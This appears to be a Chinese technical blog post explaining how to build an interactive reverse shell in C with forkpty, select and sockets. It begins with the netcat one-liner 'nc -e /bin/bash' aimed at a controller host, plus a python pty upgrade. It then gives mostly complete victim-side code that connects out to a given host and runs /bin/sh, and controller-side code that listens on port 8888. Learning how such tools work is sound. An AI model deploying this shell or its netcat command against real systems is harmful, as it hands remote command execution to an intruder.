+++
title = "写一个可交互的反弹 Shell"
date = 2022-05-02T19:19:57+08:00
[taxonomies]
tags = ["linux"]
+++

在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 `nc -e /bin/bash $控制机IP $控制机端口` 弹出一个 Shell，然后再用 `python3 -c 'import pty; pty.spawn("/bin/bash")'` 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。

## “可交互 Shell” 的原理

现在常见的“终端模拟器”，例如 KDE 的 Konsole, MACos 上的 iterm，服务器上的 SSH，都是使用 "pty" 来实现的。而我们反弹的 Shell 则不一样，所以无法交互。

而 pty 则是模拟终端的设备。平时使用的终端模拟器是和 pty master 进行沟通，而里面的 shell 是和 pty slave 进行沟通，两者通过 pty 进行沟通。

```txt
终端模拟器 <=> | pty master | pty | pty slave | <=> shell
```

所以我们的实现也很简单，通过 socket 将被控端的 master 和控制端连接起来就好了。

```txt
终端模拟器 <=> 控制端 <=(socket 通信)=> 被控端 <=> | pty master | pty | pty slave | <=> shell
```

## 代码实现

首先是导入相关文件，"pty.h" 包含 pty 相关函数的定义，而 "select.h" 则是用来处理异步通信的。

```c
#include <pty.h>
#include <sys/select.h>
#include <unistd.h>

#include <stdio.h>
#include <stdlib.h>

#include "util.h"
```

被控端代码很简单，通过传入的 `host` 和 `port` 创建 socket 连接，然后通过 `forkpty` 创建 pty，在父进程中进行 socket 和子进程中的通信。

需要注意的是 `forkpty` 函数，在 FreeBSD 的 `man` 手册的说明如下

```txt
The  forkpty()  function  combines  openpty(),  fork(2),  and  login_tty() to create a new
process operating in a pseudoterminal.  A file descriptor referring to master side of  the
pseudoterminal  is  returned  in amaster.  If name is not NULL, the buffer it points to is
used to return the filename of the slave.  The termp and winp arguments, if not NULL, will
determine the terminal attributes and window size of the slave side of the pseudoterminal.
```

简单翻译就是创建一对 pty，并且 fork 出子进程，然后将 master fd 和 pty 连接起来，将子进程的输入和输出和 slave fd 连接起来。这样的话，父进程只要通过 master fd 就可以和处于 pty slave 处的子进程进行沟通。

```c
int main(int argc, char **argv, char **envp) {
  if (argc < 3) {
    printf("Usage: %s [host] [port]\n", argv[0]);
    return -1;
  }
  int port = atoi(argv[2]);
  int socket_fd = 0, master_fd = 0;
  if ((socket_fd = get_socket_connect(argv[1], port)) <= 0) {
    return -2;
  }
  // Use forkpty to handle communication between pty master and socket
  int pid = forkpty(&master_fd, NULL, NULL, NULL);
  if (pid < 0) {
    return -3;
  } else if (pid != 0) {
    // Parent
    copy_loop(master_fd, socket_fd);
  } else {
    // Child
    execve("/bin/sh", NULL, NULL);
    exit(0);
  }
  return 0;
}
```

下面的代码则是在两个 fd 之间互相复制内容。通过 `select` 函数判断哪个 fd 可读，然后将可读 fd 里的内容输出到另一个 fd 里。

```c
static int copy_loop(int fd1, int fd2) {
  plog("%d, %d", fd1, fd2);
  for (;;) {
    fd_set set;
    FD_ZERO(&set);
    FD_SET(fd1, &set);
    FD_SET(fd2, &set);
    if (select(max(fd1, fd2) + 1, &set, NULL, NULL, NULL) <= 0) {
      return -2;
    }
    int read_fd = 0, write_fd = 0;
    if (FD_ISSET(fd1, &set)) {
      read_fd = fd1;
      write_fd = fd2;
    } else if (FD_ISSET(fd2, &set)) {
      read_fd = fd2;
      write_fd = fd1;
    }
    int read_bytes = copy_data(read_fd, write_fd);
    if (read_bytes < 0) {
      return read_bytes;
    }
  }
}
```

而控制端的代码看起来会比较奇怪。首先是打开了 `/proc/self/fd/0`，可以看到这是指向了 `/dev/pts/1`，即打开当前的 pty。

```bash
~/d/chenx6.github.io > ls -la /proc/self/fd
总用量 0
dr-x------ 2 chenx chenx  0  5月  2 19:47 .
dr-xr-xr-x 9 chenx chenx  0  5月  2 19:47 ..
lrwx------ 1 chenx chenx 64  5月  2 19:47 0 -> /dev/pts/1
lrwx------ 1 chenx chenx 64  5月  2 19:47 1 -> /dev/pts/1
lrwx------ 1 chenx chenx 64  5月  2 19:47 2 -> /dev/pts/1
lr-x------ 1 chenx chenx 64  5月  2 19:47 3 -> /proc/1091/fd
lr-x------ 1 chenx chenx 64  5月  2 19:47 51 -> anon_inode:inotify
```

然后是终端的设置。对 `c_lflag` 本地模式进行设置，设置为不回显，uncanonical mode。然后是对 `c_cc` 特殊字符设置不处理 ”^C / ^Z / ^\“。

最后就是创建 socket 连接，复制数据(和被控端类似，区别请见末尾的文件)。当复制结束时则恢复回原本的终端设置。

```c
#include <arpa/inet.h>
#include <fcntl.h>
#include <pty.h>
#include <sys/select.h>
#include <sys/types.h>
#include <termios.h>
#include <unistd.h>

#include <stdio.h>
#include <stdlib.h>

#include "util.h"

int main() {
  // PTY
  int pty_fd = open("/proc/self/fd/0", O_RDWR);
  struct termios terminal, origin_terminal;
  tcgetattr(pty_fd, &terminal);
  origin_terminal = terminal;
  // turn off echo, uncanonical mode
  terminal.c_lflag &= ~ECHO;
  terminal.c_lflag &= ~ICANON;
  // Don't handle ^C / ^Z / ^\
  terminal.c_cc[VINTR] = 0;
  terminal.c_cc[VQUIT] = 0;
  terminal.c_cc[VSUSP] = 0;
  tcsetattr(pty_fd, TCSANOW, &terminal);

  // Socket
  int listen_fd = get_socket_listen("0.0.0.0", 8888);
  socklen_t s;
  struct sockaddr accepted_addr;
  int accepted_fd = accept(listen_fd, &accepted_addr, &s);
  copy_loop(accepted_fd);
  tcsetattr(pty_fd, TCSANOW, &origin_terminal);
  return 0;
}
```

可以看到，很少的代码就能创建一个交互式反弹 Shell，还能复习 UNIX 知识。

完整代码在这：<https://github.com/chenx6/gadget/tree/master/rev_pty>

## Refs

- 基于原本的项目，魔改了下，兼容 Python3 <https://github.com/chenx6/python-pty-shells>
- [pseudo-terminal 基础一](https://segmentfault.com/a/1190000019747315)
- [linux select函数解析以及事例](https://zhuanlan.zhihu.com/p/57518857)
